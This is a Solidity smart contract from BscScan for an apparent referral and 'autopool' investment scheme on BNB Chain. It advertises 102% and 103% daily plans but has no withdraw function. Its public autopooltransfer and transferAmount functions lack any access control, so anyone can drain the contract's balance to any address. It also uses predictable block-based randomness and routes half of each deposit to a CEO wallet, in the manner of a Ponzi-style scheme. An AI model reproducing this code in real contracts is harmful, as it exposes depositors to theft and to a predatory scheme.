/**
 *Submitted for verification at BscScan.com on 2022-04-08
*/

/**
 *Submitted for verification at BscScan.com on 2022-02-18
*/

pragma solidity 0.5.10;

contract BNBInvestApr01{
	using SafeMath for uint256;

	uint256[] public INVEST_MIN_AMOUNT = [0.003 ether,0.005 ether]; 
	uint256[] public INVEST_MAX_AMOUNT = [0.003 ether,0.005 ether]; 
	uint256[] public REFERRAL_PERCENTS = [50];
	uint256 constant public TOTAL_REF = 50;
	uint256 constant public CEO_FEE = 50;
	uint256 constant public PERCENTS_DIVIDER = 100;
	uint256 constant public TIME_STEP = 1 days;

    uint[] public autopoolusersarray;

	uint256 public totalInvested;
	uint256 public totalReferral;
    uint256 public totalUserAutoPool;

    uint256 public totalUsers;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}


	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[1] levels;
        address autopoolusers;
		uint256 bonus;
        uint256 userautopool;
		uint256 totalBonus;
		uint256 withdrawn;
        uint256 rankid;
        uint256 userautopoolbonus;
        string transType;
        uint256 userid;
        address useraddress;
        uint256 mydownlines;
	}

    struct Userinfo {
        uint256 iduser;
        address addressuser;
        uint[] autopooldownlineuserinfo;
	}

	mapping (address => User) internal users;

    mapping (uint256 => Userinfo) internal infouser;

	uint256 public startDate;

	address payable public ceoWallet;

    address payable public autopooluser;

    uint256 public lastautopoolid; 

    	
	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount, uint256 time);
	event Withdrawn(address indexed user, uint256 amount, uint256 time);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable ceoAddr, address payable autopool, uint256 start) public {
		require(!isContract(ceoAddr));
		ceoWallet = ceoAddr;

        autopooluser=autopool;

		if(start>0){
			startDate = start;
		}
		else{
			startDate = block.timestamp;
		}

        plans.push(Plan(1,  1020)); // 102%
        plans.push(Plan(1,  1030)); // 103%

	}

	function invest(address payable referrer, uint8 plan) public payable {
		require(block.timestamp > startDate, "contract does not launch yet");
		require(msg.value >= INVEST_MIN_AMOUNT[plan],"invalid min amount");
		require(msg.value <= INVEST_MAX_AMOUNT[plan],"invalid max amount");
        require(plan < 4, "Invalid plan");

		uint256 ceo = msg.value.mul(CEO_FEE).div(PERCENTS_DIVIDER);
		
		User storage user = users[msg.sender];

		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
                /*9-Silver,19-Golden,29-Platinum,49-Diamond */
                    if(getUserTotalReferrals(user.referrer)==9){
                          users[referrer].rankid = users[referrer].rankid.add(2);
                          users[referrer].rankid = users[referrer].rankid.sub(1);
                    }else if(getUserTotalReferrals(user.referrer)==19){
                           users[referrer].rankid = users[referrer].rankid.add(3);
                           users[referrer].rankid = users[referrer].rankid.sub(2);
                    }else if(getUserTotalReferrals(user.referrer)==29){
                         users[referrer].rankid = users[referrer].rankid.add(4);
                         users[referrer].rankid = users[referrer].rankid.sub(3);                                                  
                    }else if(getUserTotalReferrals(user.referrer)==49){
                         users[referrer].rankid = users[referrer].rankid.add(5);
                         users[referrer].rankid = users[referrer].rankid.sub(4);                                                  
                    }
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 1; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;

				} else break;
			}
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 1; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					totalReferral = totalReferral.add(amount);
                    emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
                    user.rankid = 1;
                    
                    //if(getUserTotalReferrals(referrer)==3){
                    if(getUserTotalReferrals(referrer)==2){
                             
                            /*This is a Main Condition Start*/
                             if(lastautopoolid==0 && totalUserAutoPool==0){
                                 lastautopoolid = getUserID(referrer);
                                 autopooluser.transfer(ceo);
                                 users[referrer].userautopool = users[referrer].userautopool.add(1);
                                 autopoolusersarray.push(lastautopoolid);                  

                                 Userinfo storage userinfo=infouser[totalUsers];
                                 infouser[0].autopooldownlineuserinfo.push(lastautopoolid);
                             }
                             else{
                                 uint256 randomno= random(totalUserAutoPool);
                                 address lastpooluseraddress=getUserAddress(lastautopoolid);
                                 uint256 getLastRankID = getUserRankID(lastpooluseraddress);
                                 if(randomno>0 && randomno!=0){
                                  /*50Per User and 50Per Rank User Autopool Commission Send Start*/ 
                                  if(getLastRankID==1){
                                      address randompooluseraddress=getUserAddress(randomno);
                                      uint256 getRandomRankID = getUserRankID(randompooluseraddress);
                                      if(getRandomRankID!=1){
                                        lastautopoolid = getUserID(referrer);
                                        autopooltransfer(getUserAddress(randomno),ceo);
                                        users[referrer].userautopool = users[referrer].userautopool.add(1);
                                        autopoolusersarray.push(lastautopoolid);
                                    
                                        users[getUserAddress(randomno)].userautopoolbonus = users[getUserAddress(randomno)].userautopoolbonus.add(ceo);

                                        Userinfo storage userinfo=infouser[totalUsers];
                                        infouser[randomno].autopooldownlineuserinfo.push(lastautopoolid);
                                      }
                                  }else{
                                      
                                    lastautopoolid = getUserID(referrer);
                                    autopooltransfer(getUserAddress(randomno),ceo);
                                    users[referrer].userautopool = users[referrer].userautopool.add(1);
                                    autopoolusersarray.push(lastautopoolid);
                                    users[getUserAddress(randomno)].userautopoolbonus = users[getUserAddress(randomno)].userautopoolbonus.add(ceo);                                 
                                    
                                    Userinfo storage userinfo=infouser[totalUsers];
                                    infouser[randomno].autopooldownlineuserinfo.push(lastautopoolid);
                                  }
                                  /*50Per User and 50Per Rank User Autopool Commission Send Stop*/ 
                                }else{
                                 lastautopoolid = getUserID(referrer);
                                 autopooltransfer(getUserAddress(1),ceo);
                                 users[referrer].userautopool = users[referrer].userautopool.add(1);
                                 autopoolusersarray.push(lastautopoolid);
                                 users[getUserAddress(1)].userautopoolbonus = users[getUserAddress(1)].userautopoolbonus.add(ceo);
                                  
                                  Userinfo storage userinfo=infouser[totalUsers];
                                  infouser[1].autopooldownlineuserinfo.push(lastautopoolid);
                                }

                             }
                             /*This is a Main Condition Stop*/
                        totalUserAutoPool=totalUserAutoPool.add(1);
                    }else{
                        ceoWallet.transfer(ceo);
                        users[getUserReferrer(referrer)].transType="depositwithoutautopool";
                    }
                    transferAmount(getUserReferrer(msg.sender),amount);
                    
				} else break;
			}
		}else{
            ceoWallet.transfer(ceo);
			uint256 amount = msg.value.mul(TOTAL_REF).div(PERCENTS_DIVIDER);
			ceoWallet.transfer(amount);
			totalReferral = totalReferral.add(amount);
            user.rankid = 1;
            user.transType = "depositwithoutautopool";
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}
        

		user.deposits.push(Deposit(plan, msg.value, block.timestamp));

		totalInvested = totalInvested.add(msg.value);

        totalUsers=totalUsers.add(1);

        user.userid = totalUsers;

        user.useraddress = msg.sender;

        Userinfo storage userinfo=infouser[totalUsers];

        userinfo.iduser = totalUsers;

        userinfo.addressuser = msg.sender;

		emit NewDeposit(msg.sender, plan, msg.value, block.timestamp);
	}

    function random(uint number) public view returns(uint){
        return uint(keccak256(abi.encodePacked(block.timestamp,block.difficulty,  
        msg.sender))) % number;
    }

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			if (user.checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}

		return totalAmount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[1] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0];
	}

    function getUserAutoPoolReferrals(address userAddress) public view returns(address) {
		return users[userAddress].autopoolusers;
	}

    function getUserRankID(address userAddress) public view returns(uint256) {
		return users[userAddress].rankid;
	}

    function getUserAddress(uint256 iduser) public view returns(address) {
		return infouser[iduser].addressuser;
	}

    function getUserDownlineAutopool(uint256 iduser)public view returns(uint [] memory){
        return infouser[iduser].autopooldownlineuserinfo;
    }

    function getUserID(address userAddress) public view returns(uint256) {
		return users[userAddress].userid;
	}

    function getUserAutopoolTotalDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].userautopoolbonus;
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

    function getAutoPoolUser(address userAddress) public view returns(uint256) {
		return users[userAddress].userautopool;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

    	plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus,uint256 _contractBalance) {
		return(totalInvested, totalReferral,getContractBalance());
	}

	function getUserInfo(address userAddress) public view returns(uint256 checkpoint, uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals, uint256 rankid, uint256 userautopool,uint256 userid) {
		return(getUserCheckpoint(userAddress), getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress), getUserRankID(userAddress), getAutoPoolUser(userAddress), getUserID(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function autopooltransfer(address _to, uint256 _value) public {
       return address(uint160(_to)).transfer(_value);
    }

    function transferAmount(address _to, uint256 _value) public {
       return address(uint160(_to)).transfer(_value);
    }

    function getArrAutopoolUser() public view returns (uint[] memory) {
        return autopoolusersarray;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }

    function randomno(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: randomno by zero");
        uint256 c = a / b;

        return c;
    }
}